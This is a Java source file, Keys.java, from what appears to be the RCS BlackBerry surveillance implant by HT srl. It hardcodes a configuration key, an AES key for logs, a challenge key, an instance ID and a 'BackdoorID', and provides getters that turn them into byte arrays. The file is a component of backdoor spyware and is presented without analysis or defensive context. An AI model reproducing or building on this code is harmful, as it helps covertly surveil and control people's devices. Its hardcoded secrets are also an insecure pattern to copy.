/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Keys.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.config;

import com.ht.rcs.blackberry.utils.Utils;

public class Keys {
	private static String Conf = "Adf5V57gQtyi90wUhpb8Neg56756j87R";
	private static String Aes = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // markup,
																	// log
	private static String InstanceID = "bg5etG87q20Kg52W5Fg1";
	private static String BackdoorID = "av3pVck1gb4eR2d8";
	private static String Challenge = "f7Hk0f5usd04apdvqw13F5ed25soV5eD";
	private static String ConfName = "c3mdX053du1YJ541vqWILrc4Ff71pViL"; // wchar

	private static byte[] KeyFromString(String string) {
		byte[] key = new byte[16];
		Utils.Copy(key, 0, string.getBytes(), 0, 16);
		return key;
	}

	public static byte[] byteAesKey;

	public static byte[] getAesKey() {
		if (byteAesKey == null) {
			byteAesKey = KeyFromString(Aes);
		}
		return byteAesKey;
	}

	public static byte[] byteChallengeKey;

	public static byte[] getChallengeKey() {
		if (byteChallengeKey == null) {
			byteChallengeKey = KeyFromString(Challenge);
		}

		return byteChallengeKey;
	}

	public static byte[] byteConfKey;

	public static byte[] getConfKey() {
		if (byteConfKey == null) {
			byteConfKey = KeyFromString(Conf);
		}

		return byteConfKey;
	}

	public static byte[] getBackdoorId() {
		return BackdoorID.getBytes();
	}

	public static byte[] getInstanceId() {

		return InstanceID.getBytes();
	}
}
